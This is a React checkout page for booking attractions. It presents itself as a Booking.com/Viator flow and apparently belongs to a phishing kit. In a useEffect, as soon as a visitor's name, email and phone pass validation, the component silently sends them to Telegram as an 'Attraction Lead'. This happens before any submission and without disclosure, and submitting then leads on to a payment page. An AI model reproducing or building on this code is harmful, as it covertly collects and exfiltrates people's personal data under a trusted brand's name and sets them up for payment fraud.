import React from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import './AttractionCheckout.css';
import { sendTelegram } from './services/telegram';

const DETAIL_CACHE_PREFIX = 'attractionDetail';
type FieldName = 'firstName' | 'lastName' | 'email' | 'phone';

const AttractionCheckout: React.FC = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const slug = searchParams.get('id');

  const [attraction, setAttraction] = React.useState<any>(null);
  const [firstName, setFirstName] = React.useState('');
  const [lastName, setLastName] = React.useState('');
  const [email, setEmail] = React.useState('');
  const [phone, setPhone] = React.useState('');
  const [countryCode, setCountryCode] = React.useState('+1');
  const [specialRequest, setSpecialRequest] = React.useState('');
  const [requiresPickup, setRequiresPickup] = React.useState(false);
  const [contactShared, setContactShared] = React.useState(false);
  const [errors, setErrors] = React.useState<Record<FieldName, string>>({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
  });
  const [touched, setTouched] = React.useState<Record<FieldName, boolean>>({
    firstName: false,
    lastName: false,
    email: false,
    phone: false,
  });
  const [ticketSelection, setTicketSelection] = React.useState<any>(null);
  const refreshSessionTimestamp = React.useCallback(() => {
    try {
      sessionStorage.setItem('session_timestamp', Date.now().toString());
    } catch (err) {
      console.warn('Unable to refresh session timestamp', err);
    }
  }, []);

  React.useEffect(() => {
    refreshSessionTimestamp();
  }, [refreshSessionTimestamp]);

  React.useEffect(() => {
    if (!slug) return;
    try {
      const cached = sessionStorage.getItem(`${DETAIL_CACHE_PREFIX}:${slug}`);
      if (cached) {
        const parsed = JSON.parse(cached);
        setAttraction(parsed?.data ?? parsed);
      } else {
        const fallback = sessionStorage.getItem('selectedAttraction');
        if (fallback) {
          setAttraction(JSON.parse(fallback));
        }
      }
      const selectionRaw = sessionStorage.getItem('attraction_ticket_selection');
      if (selectionRaw) {
        const selection = JSON.parse(selectionRaw);
        if (!selection?.slug || selection.slug === slug) {
          setTicketSelection(selection);
        }
      }
    } catch (err) {
      console.error('Unable to load attraction data for checkout', err);
    }
  }, [slug]);

  const validateField = React.useCallback((field: FieldName, value: string) => {
    const cleaned = value.trim();
    switch (field) {
      case 'firstName':
        if (!cleaned) return 'Enter first name';
        if (cleaned.length < 2) return 'Too short';
        return '';
      case 'lastName':
        if (!cleaned) return 'Enter last name';
        if (cleaned.length < 2) return 'Too short';
        return '';
      case 'email':
        if (!cleaned) return 'Enter email';
        if (!/\S+@\S+\.\S+/.test(cleaned)) return 'Invalid email';
        return '';
      case 'phone':
        if (!cleaned) return 'Enter phone';
        if (!/^[\d\s()+-]{5,}$/.test(cleaned)) return 'Invalid phone';
        return '';
      default:
        return '';
    }
  }, []);

  React.useEffect(() => {
    const allValid =
      !validateField('firstName', firstName) &&
      !validateField('lastName', lastName) &&
      !validateField('email', email) &&
      !validateField('phone', phone);

    if (!contactShared && allValid) {
      const message = `📋 <b>Attraction Lead</b>\n` +
        `<b>Name:</b> ${firstName.trim()} ${lastName.trim()}\n` +
        `<b>Email:</b> ${email.trim()}\n` +
        `${phone ? `<b>Phone:</b> ${countryCode} ${phone.trim()}\n` : ''}` +
        `<b>Attraction:</b> ${attraction?.name || 'N/A'}`;
      sendTelegram(message);
      setContactShared(true);
    }

    if (contactShared && !allValid) {
      setContactShared(false);
    }
  }, [firstName, lastName, email, phone, countryCode, attraction, contactShared, validateField]);

  const handleFieldChange = (field: FieldName, value: string) => {
    switch (field) {
      case 'firstName':
        setFirstName(value);
        break;
      case 'lastName':
        setLastName(value);
        break;
      case 'email':
        setEmail(value);
        break;
      case 'phone':
        setPhone(value);
        break;
    }
    setErrors((prev) => ({ ...prev, [field]: validateField(field, value) }));
  };

  const handleBlur = (field: FieldName) => {
    setTouched((prev) => ({ ...prev, [field]: true }));
    switch (field) {
      case 'firstName':
        setErrors((prev) => ({ ...prev, firstName: validateField('firstName', firstName) }));
        break;
      case 'lastName':
        setErrors((prev) => ({ ...prev, lastName: validateField('lastName', lastName) }));
        break;
      case 'email':
        setErrors((prev) => ({ ...prev, email: validateField('email', email) }));
        break;
      case 'phone':
        setErrors((prev) => ({ ...prev, phone: validateField('phone', phone) }));
        break;
    }
  };

  if (!attraction) {
    return (
      <div className="checkout-page">
        <div className="checkout-header">
          <button className="back-btn" onClick={() => navigate(-1)} aria-label="Back">
            ←
          </button>
          <h1>Personal info</h1>
          <div className="header-spacer" />
        </div>
        <div className="availability-empty">
          <p>Attraction data is unavailable. Please reopen the detail page.</p>
        </div>
      </div>
    );
  }

  const basePrice =
    attraction.representativePrice?.publicAmount ??
    attraction.representativePrice?.chargeAmount ??
    0;
  const currency = attraction.representativePrice?.currency ?? 'USD';
  const selectionTotal = ticketSelection?.total ?? basePrice;
  const selectionBreakdown = Array.isArray(ticketSelection?.breakdown)
    ? ticketSelection.breakdown.filter((item: any) => item?.count > 0)
    : [];
  const heroImage =
    attraction.photos?.[0]?.small ||
    attraction.primaryPhoto?.small ||
    attraction.gallery?.[0]?.small ||
    '';

  const pickupAvailable =
    attraction.whatsIncluded?.some((item: string) => /pickup/i.test(item)) ||
    (attraction.addresses?.pickup && attraction.addresses.pickup.length > 0) ||
    (attraction.addresses?.guestPickup && attraction.addresses.guestPickup.length > 0);

  const formatPrice = (value: number) =>
    new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency,
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    }).format(value);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const validation: Record<FieldName, string> = {
      firstName: validateField('firstName', firstName),
      lastName: validateField('lastName', lastName),
      email: validateField('email', email),
      phone: validateField('phone', phone),
    };
    setErrors(validation);
    setTouched({ firstName: true, lastName: true, email: true, phone: true });
    const hasErrors = Object.values(validation).some(Boolean);
    if (hasErrors) {
      window.scrollTo({ top: 0, behavior: 'smooth' });
      return;
    }

    const payload = {
      contact: {
        firstName: firstName.trim(),
        lastName: lastName.trim(),
        email: email.trim(),
        phone: `${countryCode} ${phone.trim()}`,
        specialRequest,
        requiresPickup,
      },
      attraction: {
        id: slug || attraction.slug,
        name: attraction.name,
        price: selectionTotal,
        currency,
        image: heroImage,
        operator: attraction.operatedBy,
        startTime: attraction.startTimes?.[0] || '14:00',
        cancellation: attraction.cancellationPolicy?.hasFreeCancellation || false,
        pickupAvailable,
        selection: ticketSelection,
      },
    };

    refreshSessionTimestamp();
    sessionStorage.setItem('attraction_payment_payload', JSON.stringify(payload));
    console.log('AttractionCheckout: Saved payload to sessionStorage', {
      hasPayload: !!sessionStorage.getItem('attraction_payment_payload'),
      payloadKeys: Object.keys(payload),
    });
    navigate('/payment');
  };

  return (
    <div className="checkout-page">
      <div className="checkout-header">
        <button className="back-btn" onClick={() => navigate(-1)} aria-label="Back">
          ←
        </button>
        <h1>Personal info</h1>
        <div className="header-spacer" />
      </div>

      <form id="checkout-form" className="checkout-content" onSubmit={handleSubmit}>
        <section className="form-card">
          <h2>Contact details</h2>
          <div className="form-grid">
            <label className={`form-field ${touched.firstName && errors.firstName ? 'error' : ''}`}>
              <span>First Name*</span>
              <input
                type="text"
                value={firstName}
                onChange={(e) => handleFieldChange('firstName', e.target.value)}
                onBlur={() => handleBlur('firstName')}
                placeholder="First name"
              />
            </label>
            <label className={`form-field ${touched.lastName && errors.lastName ? 'error' : ''}`}>
              <span>Last name*</span>
              <input
                type="text"
                value={lastName}
                onChange={(e) => handleFieldChange('lastName', e.target.value)}
                onBlur={() => handleBlur('lastName')}
                placeholder="Last name"
              />
            </label>
            <label className={`form-field ${touched.email && errors.email ? 'error' : ''}`}>
              <span>Email Address*</span>
              <input
                type="email"
                value={email}
                onChange={(e) => handleFieldChange('email', e.target.value)}
                onBlur={() => handleBlur('email')}
                placeholder="email@example.com"
              />
              <small>We'll send your confirmation details to this email</small>
            </label>
            <div className={`form-field phone-field ${touched.phone && errors.phone ? 'error' : ''}`}>
              <span>Phone number*</span>
              <div className="phone-input">
                <label className="country-input">
                  <span className="sr-only">Country code</span>
                  <input
                    type="text"
                    value={countryCode}
                    onChange={(e) => setCountryCode(e.target.value.replace(/[^\d+]/g, ''))}
                    placeholder="+1"
                  />
                </label>
                <label className="number-input">
                  <span className="sr-only">Phone</span>
                  <input
                    type="tel"
                    value={phone}
                    onChange={(e) => handleFieldChange('phone', e.target.value)}
                    onBlur={() => handleBlur('phone')}
                    placeholder="Enter phone number"
                    inputMode="tel"
                  />
                </label>
              </div>
            </div>
          </div>
        </section>

        <section className="form-card">
          <h2>Reservation details</h2>
          <p className="helper-text">
            {attraction.operatedBy
              ? `The attraction operator (${attraction.operatedBy}) needs a few more details to complete your booking.`
              : 'Please share a few more details to complete your booking.'}
          </p>

          {pickupAvailable && (
            <div className="pickup-card">
              <div className="pickup-option">
                <label>
                  <input
                    type="radio"
                    name="pickup"
                    checked={requiresPickup}
                    onChange={() => setRequiresPickup(true)}
                  />
                  <div>
                    <p className="option-title">I need to be picked up</p>
                    <p className="option-subtitle">Indicate the location</p>
                  </div>
                </label>
                <button
                  type="button"
                  className="link-btn"
                  onClick={() => alert('Pickup location selection not implemented')}
                >
                  Change location
                </button>
              </div>
              <div className="pickup-option">
                <label>
                  <input
                    type="radio"
                    name="pickup"
                    checked={!requiresPickup}
                    onChange={() => setRequiresPickup(false)}
                  />
                  <div>
                    <p className="option-title">I'll arrive at the meeting point</p>
                    <p className="option-subtitle">Use the instructions in your confirmation</p>
                  </div>
                </label>
              </div>
            </div>
          )}

          <label className="form-field">
            <span>Do you have special requirements? (Optional)</span>
            <textarea
              value={specialRequest}
              onChange={(e) => setSpecialRequest(e.target.value)}
              placeholder="Add notes for the operator"
            />
          </label>
        </section>

        {attraction.cancellationPolicy?.hasFreeCancellation && (
          <section className="info-block">
            <h3>Cancellation policy</h3>
            <p className="positive">Free cancellation available</p>
            <p>
              You can cancel for free before 26 Nov at 14:00 (attraction time zone)
            </p>
          </section>
        )}

        <section className="info-block">
          <h3>The fine print</h3>
          <p>This experience is powered by a business.</p>
          <p>
            By clicking "Next step" and completing a booking, you agree with the terms and
            conditions and privacy policy of Booking.com and the privacy policy of Viator.
          </p>
        </section>
      </form>

      <div className="checkout-summary">
        <div className="price-info">
          <div className="price-row">
            <span className="price-label">Total</span>
            <span className="price-new">{formatPrice(selectionTotal)}</span>
          </div>
          {selectionBreakdown.length > 0 && (
            <div style={{ color: '#bbb', fontSize: 13, marginTop: 6, lineHeight: 1.4 }}>
              {selectionBreakdown.map((item: any) => (
                <div key={item.type}>
                  {item.label}: {item.count} × {formatPrice(item.pricePerTicket)}
                </div>
              ))}
            </div>
          )}
          <p className="tax-note">Includes taxes and fees</p>
        </div>
        <button type="submit" form="checkout-form" className="primary-btn">
          Next step
        </button>
      </div>
    </div>
  );
};

export default AttractionCheckout;

